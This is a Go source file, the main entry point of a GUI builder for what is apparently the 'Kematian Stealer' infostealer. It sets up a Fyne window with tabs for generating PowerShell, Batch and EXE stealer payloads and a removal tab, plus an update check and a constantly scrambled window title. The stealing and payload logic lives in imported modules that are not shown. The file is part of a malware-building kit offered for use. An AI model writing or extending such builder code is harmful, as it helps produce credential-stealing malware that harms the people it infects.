package main

import (
	"time"
	"builder/modules/autoUpdate"
	"builder/modules/cursed"
	"builder/modules/options/utils"
	"builder/ui-tabs/batchTab"
	"builder/ui-tabs/exeTab"
	"builder/ui-tabs/homeTab"
	"builder/ui-tabs/powershellTab"
	"builder/ui-tabs/removeTab"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/widget"
)

func main() {
	// Initialize the Fyne application
	a := app.New()

	// Generate window title and properties
	win := a.NewWindow(cursed.Generate("Kematian Stealer OLD Builder", "normal", true, true, true))
	win.Resize(fyne.NewSize(500, 400))
	win.CenterOnScreen()

	// Load code before setting up the UI
	utils.LoadCode()

	// Check for updates before setting the window content
	if !autoUpdate.AutoUpdate() {
		utils.MakeSuccessMessage(a, "A NEW UPDATE IS AVAILABLE! PLEASE DOWNLOAD IT FROM THE GITHUB REPO!")
	}

	// Create the tabbed interface
	tabs := container.NewAppTabs(
		container.NewTabItem("Home", homeTab.GetHomeTab(a)),
		container.NewTabItem("Powershell", powershellTab.GetBuilderPowershell(a)),
		container.NewTabItem("Batch", batchTab.GetBatchBuilder(a)),
		container.NewTabItem("EXE", exeTab.GetExeBuilder(a)),
		container.NewTabItem("Remove", removeTab.GetRemoveTab(a)),
		container.NewTabItem("Credits", widget.NewLabel("I NOT GAY, I LOVE YOU")),
	)

	// Set the tabs as the content of the window
	win.SetContent(tabs)

	// Set the location of the tabs
	tabs.SetTabLocation(container.TabLocationLeading)

	// Create a channel for updating the window title
	outputChannel := make(chan string)

	// Start a goroutine to periodically generate new titles
	go func() {
		ticker := time.NewTicker(25 * time.Millisecond)
		defer ticker.Stop()

		for range ticker.C {
			output := cursed.Generate("Kematian Stealer OLD Builder", "normal", true, true, true)
			outputChannel <- output
		}
	}()

	// Start a goroutine to update the window title based on channel messages
	go func() {
		for output := range outputChannel {
			win.SetTitle(output)
		}
	}()

	// Show the window and start the Fyne application loop
	win.ShowAndRun()
}
